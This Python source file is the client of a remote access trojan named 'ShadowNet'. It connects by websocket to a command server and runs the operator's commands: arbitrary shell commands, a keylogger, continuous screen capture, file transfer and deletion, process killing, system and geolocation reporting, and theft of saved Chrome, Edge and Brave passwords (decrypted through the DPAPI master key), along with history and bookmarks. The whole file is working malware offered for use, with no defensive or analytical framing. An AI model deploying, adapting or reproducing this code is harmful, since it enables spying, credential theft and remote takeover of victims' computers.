import asyncio
import websockets
import base64
import pyautogui
import io
import sys
import platform
import socket
import re
import uuid
import json
import psutil
import requests
import logging
from pathlib import Path
import math
import os
import pynput
import subprocess
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from browser_history.browsers import Chrome, Edge, Brave


class Websocket:
    def __init__(self):
        self.web_socket = None


    async def init_websocket(self, uri):
        self.web_socket = await websockets.connect(uri)
        return self.web_socket
    


class Identifier:
    def __init__(self):
        self.identifier = None
    

    async def init_identifier(self):
        if os.path.exists('conf.json'):
            with open('conf.json', 'r') as configuration:
                conf = json.loads(configuration.read())
                self.identifier = conf['identifier']
        else:
            self.identifier = str(uuid.uuid1())
            with open('conf.json', 'w') as configuration:
                configuration.write(json.dumps({
                    "identifier" : self.identifier
                }))



class Helpers:

    def __bytes_to_b(self, bytes_val):
        return f'{bytes_val} B'
    

    def __bytes_to_kb(self, bytes_val):
        kb = bytes_val / 1024
        if kb < 1:
            return self.__bytes_to_b(bytes_val)
        else:
            return f'{round(kb, 2)} KB'
    

    def __bytes_to_mb(self, bytes_val):
        mb = bytes_val / (1024 ** 2)
        if mb < 1:
            return self.__bytes_to_kb(bytes_val)
        else:
            return f'{round(mb, 2)} MB'
    

    def __bytes_to_gb(self, bytes_val):
        gb = bytes_val / (1024 ** 3)
        if gb < 1:
            return self.__bytes_to_mb(bytes_val)
        else:
            return f'{round(gb, 2)} GB'
    

    def convert_bytes(self, bytes_val):
        return self.__bytes_to_gb(bytes_val)
    


    def encode(self, binary_data):
        encoded_string = base64.b64encode(binary_data).decode('utf-8')
        return encoded_string



    def decode(self, encoded_string):
        binary_data = base64.b64decode(encoded_string)
        return binary_data



class HostVitals(Websocket, Identifier):
    def __init__(self):
        super().__init__()


    async def init_hostvitals(self):
        host = {}
        try:
            host['identifier'] = self.identifier
            host['hostname'] = socket.gethostname()
            host['ip'] = requests.get('https://api.ipify.org').text
            host['os'] = platform.system()
            await self.web_socket.send(json.dumps({
                "type" : "hostvitals",
                "payload" : host
            }))
        except Exception as e:
            print('hostvitals: ', e)



class SystemVitals(Websocket, Identifier, Helpers):
    def __init__(self):
        super().__init__()


    def __get_disk_info(self) -> None:
        disk_partitions = psutil.disk_partitions()
        disks = []
        for partition in disk_partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'device' : partition.device,
                    'mountpoint' : partition.mountpoint,
                    'fstype' : partition.fstype,
                    'total' : self.convert_bytes(partition_usage.total),
                    'used' : self.convert_bytes(partition_usage.used),
                    'free' : self.convert_bytes(partition_usage.free),
                    'percent' : partition_usage.percent
                })
            except Exception as e:
                print('DiskInfoObjectError: ', e)
        return disks

    
    def __get_mem_info(self) -> None:
        mem_info = psutil.virtual_memory()
        mem = {}
        try:
            mem['total'] = self.convert_bytes(mem_info.total)
            mem['available'] = self.convert_bytes(mem_info.available)
            mem['used'] = self.convert_bytes(mem_info.used)
            mem['free'] = self.convert_bytes(mem_info.free)
            mem['percent_used'] = str(mem_info.percent)+'%'
            return mem
        except Exception as e:
            print('MemoryInfoError: ', e)

    
    def get_running_processes(self) -> None:
        proc = []
        try:
            processes = psutil.process_iter(['pid', 'name', 'memory_info'])
            for item in processes:
                proc.append({
                        'pid': item.info['pid'],
                        'name': item.info['name'],
                        'memory_info': self.convert_bytes(item.info['memory_info'].rss)
                    })
            sorted_processes_mem = sorted(proc, key=lambda procx: procx['memory_info'], reverse=True)
            return sorted_processes_mem
        except Exception as e:
            print('RunningProcessesError: ', e)


    def __get_system_info(self) -> None:
        system = {}
        try:
            system['platform'] = platform.system()
            system['platform_release'] = platform.release()
            system['platform_version'] = platform.version()
            system['architecture'] = platform.machine()
            system['hostname'] = socket.gethostname()
            system['mac_address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            system['public_ip'] = requests.get('https://api.ipify.org').text
            system['processor'] = platform.processor()
            system['ram'] = self.convert_bytes(psutil.virtual_memory().total)
            return system
        except Exception as e:
            print('SystemInfoError: ', e)


    def __get_network_info(self) -> None:
        net = {}
        try:
            net_info = psutil.net_if_addrs()
            for interface, addresses in net_info.items():
                net[interface] = [{'family': addr.family.name, 'address': addr.address} for addr in addresses]
            return net
        except Exception as e:
            print('NetworkInfoError: ', e)


    def __get_geolocation(self) -> None:
        ip = requests.get('https://api.ipify.org').text
        try:
            georesponse = requests.get(f'https://api.ipbase.com/v1/json/{ip}').json()
            if georesponse:
                return georesponse
        except Exception as e:
            georesponse = requests.get(f'https://ipapi.co/{ip}/json').json()
            return georesponse



    async def terminate_process(self, pid) -> None:
        try:
            p = psutil.Process(int(pid))
            p.terminate()
        except Exception as e:
            print('TerminateProcessError: ', e)



    async def init_sysvitals(self) -> None:
        try:
            data = {
                'disk' : self.__get_disk_info(),
                'memory' : self.__get_mem_info(),
                'system' : self.__get_system_info(),
                'network' : self.__get_network_info(),
                'geo' : self.__get_geolocation()
            }
            while True:
                await asyncio.sleep(5)
                await self.web_socket.send(json.dumps({
                    "type" : "sysvitals",
                    "payload" : {**data, 'processes' : self.get_running_processes()}
                }))
        except Exception as e:
            print('sysvitals', e)



class Explorer(Websocket, Identifier, Helpers):

    def __init__(self):
        super().__init__()
        self.payload_chunks = []


    async def remove_file(self, path):
        try:
            Path(path).unlink()
        except Exception as e:
            print('RemoveFileError: ', e)


    def store_file(self, path, filename):
        try:
            file_path = os.path.join(path, filename)
            with open(file_path, 'wb') as file:
                for chunk in self.payload_chunks:
                    file.write(self.decode(chunk))
            self.payload_chunks.clear()
        except Exception as e:
            print('StoreFileError: ', e)



    def list_directory_contents(self, path):
        try:
            data = {
                'content': []
            }
            if path:
                data['path'] = str(Path(path))
                for entry in Path(path).iterdir():
                    entry_type = 'dir' if entry.is_dir() else 'file'
                    data['content'].append({
                        'type': entry_type,
                        'name': entry.name,
                        'size': super().convert_bytes(entry.stat().st_size) if entry.is_file() else 0
                    })
                return data
            else:
                for dri in psutil.disk_partitions():
                    try:
                        data['content'].append({
                            'type': 'drive',
                            'name': str(dri.device),
                            'size': self.convert_bytes(psutil.disk_usage(dri.mountpoint).used)
                        })
                    except Exception as e:
                        print('ListDirContentObjectError: ', e)
                return data
        except Exception as e:
            print('ListDirContentError: ', e)



    async def upload_file(self, path):
        try:
            chunk_size = 1024 * 24
            with open(path, "rb") as file:
                file_size = os.path.getsize(path)
                total_chunks = math.ceil(file_size / chunk_size)
                while chunk := file.read(chunk_size):
                    await self.web_socket.send(json.dumps({
                        "type" : "upload_file",
                        "total_size": file_size,
                        "total_chunks": total_chunks,
                        "payload" : self.encode(chunk)
                    }))
            await self.web_socket.send(json.dumps({
                        "type" : "upload_file",
                        "payload" : 'EOF'
                    }))
        except Exception as e:
            print('FileUploadError: ', e)



    async def download_file(self, file_data):
        file_content = json.loads(file_data)
        try:
            if not file_content['payload'] == 'EOF':
                self.payload_chunks.append(file_content['payload'])
            else:
                self.store_file(file_content['path'], file_content['filename'])
        except Exception as e:
            print('FileDownloadError: ', e)



    async def init_explorer(self, path):
        await self.web_socket.send(json.dumps({
            "type" : "explorer",
            "payload" : self.list_directory_contents(path)
        }))



class Screenshare(Websocket, Identifier, Helpers):

    def __init__(self):
        super().__init__()


    async def init_screenshare(self):
        try:
            while True:
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                binary_data = buffer.getvalue()
                await self.web_socket.send(json.dumps({
                    "type" : "screenshare",
                    "payload" : super().encode(binary_data)
                }))
        except Exception as e:
            print('ScreenshareError: ', e)



class Console(Websocket):
    def __init__(self):
        super().__init__()

    
    async def init_execute_command(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            await self.web_socket.send(json.dumps({
                    "type" : "console",
                    "payload" : stdout if stdout else stderr
                }))
        except Exception as e:
            print('ConsoleError: ', e)



class Logger(Websocket, Identifier):
    def __init__(self):
        super().__init__()
        self.__logs = ""


    def __process_key(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.__logs = self.__logs + current_key



    async def __report(self):
        while True:
            if self.__logs:
                await self.web_socket.send(json.dumps({
                        "type" : "logger",
                        "identifier": self.identifier,
                        "payload" : self.__logs
                    }))
            self.__logs = ""
            await asyncio.sleep(5)


    async def init_logger(self):
        try:
            keyboard_listener = pynput.keyboard.Listener(on_press=self.__process_key)
            with keyboard_listener:
                await asyncio.create_task(self.__report())
                keyboard_listener.join()
        except KeyboardInterrupt:
            pass



class BrowserExtractor(Websocket, Identifier):
    def __init__(self):
        super().__init__()
        self.passwords = []
        self.cookies = []


    def get_master_key(self, browser):
        if browser == 'chrome':
            filename = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
        elif browser == 'edge':
            filename = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'  
        elif browser == 'brave':
            filename = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State'
        
        if os.path.exists(filename):
            with open(filename, "r") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key


    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"
        

    async def __extract_passwords(self, browser):
        if browser == 'chrome':
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
        elif browser == 'edge':
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        elif browser == 'brave':
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'

        master_key = self.get_master_key(browser)
        if os.path.exists(login_db):
            shutil.copy2(login_db, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    if len(username) > 0:
                        single_data = {
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        }
                        self.passwords.append(single_data)
            except Exception as e:
                print('BrowserExtractError: ', e)

            cursor.close()
            conn.close()

            await self.web_socket.send(json.dumps({
                "type" : "browser_extractor",
                "payload" : self.passwords
            }))

            self.passwords.clear()
            os.remove("Loginvault.db")




    async def __extract_history(self, browser):
        if browser == 'chrome':
            ch = Chrome()
            output = ch.fetch_history()
        elif browser == 'edge':
            ed = Edge()
            output = ed.fetch_history()
        elif browser == 'brave':
            br = Brave()
            output = br.fetch_history()
        
        sorted_history = sorted(output.histories, key=lambda x: x[0], reverse=True)
        formatted_history = [(entry[0].isoformat(), entry[1]) for entry in sorted_history[:100]]
        
        await self.web_socket.send(json.dumps({
            "type" : "browser_extractor",
            "payload" : formatted_history
        }))



    async def __extract_bookmarks(self, browser):
        if browser == 'chrome':
            ch = Chrome()
            output = ch.fetch_bookmarks()
        elif browser == 'edge':
            ed = Edge()
            output = ed.fetch_bookmarks()
        elif browser == 'brave':
            br = Brave()
            output = br.fetch_bookmarks()
        
        unique_bookmarks = {}
        for bookmark in output.bookmarks:
            url = bookmark[1]
            unique_bookmarks[url] = bookmark
        
        sorted_bookmarks = sorted(unique_bookmarks.values(), key=lambda x: x[0], reverse=True)
        formatted_bookmarks = [
            (entry[0].isoformat(), entry[1], entry[2], entry[3]) for entry in sorted_bookmarks
        ]

        await self.web_socket.send(json.dumps({
            "type" : "browser_extractor",
            "payload" : formatted_bookmarks
        }))



    async def init_browser_extractor(self, command = None):
        if command['type'] == 'passwords':
            await self.__extract_passwords(command['browser'])
        elif command['type'] == 'history':
            await self.__extract_history(command['browser'])
        elif command['type'] == 'bookmarks':
            await self.__extract_bookmarks(command['browser'])
        


class ShadowNet(HostVitals, SystemVitals, Console, Logger, Explorer, Screenshare, BrowserExtractor):

    def __init__(self, uri):
        super().__init__()
        self.__uri = uri


    def __cancel_task(self, task):
        try:
            task.cancel()
        except Exception as e:
            print('CancelTaskError: ', e)

        

    async def initialize(self):
        try:
            self.web_socket = await super().init_websocket(self.__uri)
            await super().init_identifier()
            asyncio.create_task(super().init_hostvitals())
            while True:
                response = await self.web_socket.recv()
                response = json.loads(response)
                if response['message'] == 'start_sysvitals':
                    sysvitals_task = asyncio.create_task(super().init_sysvitals())
                elif response['message'] == 'stop_sysvitals':
                    if sysvitals_task:
                        self.__cancel_task(sysvitals_task)
                elif response['message'] =='explorer':
                    explorer_task = asyncio.create_task(super().init_explorer(response['command'] if response['command'] else None))
                elif response['message'] =='remove_file':
                    explorer_task = asyncio.create_task(super().remove_file(response['command'] if response['command'] else None))
                elif response['message'] =='upload_file':
                    upload_file_task = asyncio.create_task(super().upload_file(response['command'] if response['command'] else None))
                elif response['message'] =='download_file':
                    download_file_task = asyncio.create_task(super().download_file(response['command'] if response['command'] else None))
                elif response['message'] =='start_logger':
                    start_logger_task = asyncio.create_task(super().init_logger())
                elif response['message'] =='stop_logger':
                    if start_logger_task:
                        self.__cancel_task(start_logger_task)
                elif response['message'] =='start_console':
                    start_execution_task = asyncio.create_task(super().init_execute_command(response['command'] if response['command'] else 'ls'))
                elif response['message'] =='stop_console':
                    if start_execution_task:
                        self.__cancel_task(start_execution_task)
                elif response['message'] =='terminate_process':
                    terminate_process = asyncio.create_task(super().terminate_process(response['command'] if response['command'] else None))
                elif response['message'] =='browser_extractor':
                    browser_extractor_process = asyncio.create_task(super().init_browser_extractor(response['command'] if response['command'] else None))
                elif response['message'] == 'start_screenshare':
                    screenshare_task = asyncio.create_task(super().init_screenshare())
                elif response['message'] == 'stop_screenshare':
                    if screenshare_task:
                        self.__cancel_task(screenshare_task)
                elif response['message'] == 'self_terminate':
                    sys.exit()
        except SystemExit as e:
            pass


    def start(self):
        asyncio.run(self.initialize())



if __name__ == '__main__':
    try:
        PUBLIC_SERVER_IP_ADDRESS = "127.0.0.1"

        sn = ShadowNet(f"ws://{PUBLIC_SERVER_IP_ADDRESS}:8000/ws/shadownet/connect/host/")
        sn.start()
    except KeyboardInterrupt:
        pass
